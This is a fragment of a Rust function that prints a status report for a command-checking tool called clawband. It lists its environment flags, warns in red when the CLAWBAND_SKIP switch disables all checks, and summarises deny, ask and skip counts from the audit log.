1019	    println!("  RTK_ENABLED    {}", flag(rtk));
1020	    println!("  SQZ_ENABLED    {}", flag(sqz));
1021	    println!("  CLAWBAND_LOG   {}", flag(logging));
1022	    if skip {
1023	        let red = "\x1b[31m";
1024	        println!(
1025	            "  CLAWBAND_SKIP  {red}{bold}ON — ALL CHECKS DISABLED{r}  {d}clawband is bypassed in this environment{r}"
1026	        );
1027	    } else {
1028	        println!("  CLAWBAND_SKIP  {}", flag(skip));
1029	    }
1030	
1031	    println!("\n{bold}Audit log{r}");
1032	    if log_path.exists() {
1033	        let total = log_deny + log_ask + log_skip;
1034	        println!(
1035	            "  {b}{}{r}  {d}({}){r}",
1036	            log_path.display(),
1037	            if total == 0 {
1038	                "empty".to_string()
1039	            } else {
1040	                format!("{total} events")
1041	            }
1042	        );
1043	        if total > 0 {
1044	            println!("  {g}deny{r}   {bold}{log_deny}{r}");
1045	            println!("  {y}ask{r}    {bold}{log_ask}{r}");
1046	            if log_skip > 0 {
1047	                let red = "\x1b[31m";
1048	                println!("  {red}skip{r}   {bold}{log_skip}{r}  {d}(bypassed by CLAWBAND_SKIP){r}");
1049	            }
1050	        }
1051	    } else if logging {
1052	        println!("  {d}enabled — no events yet{r}");
1053	    } else {
1054	        println!("  {d}set CLAWBAND_LOG=1 in clawband to activate{r}");
1055	    }
1056	
1057	    println!();
1058	}
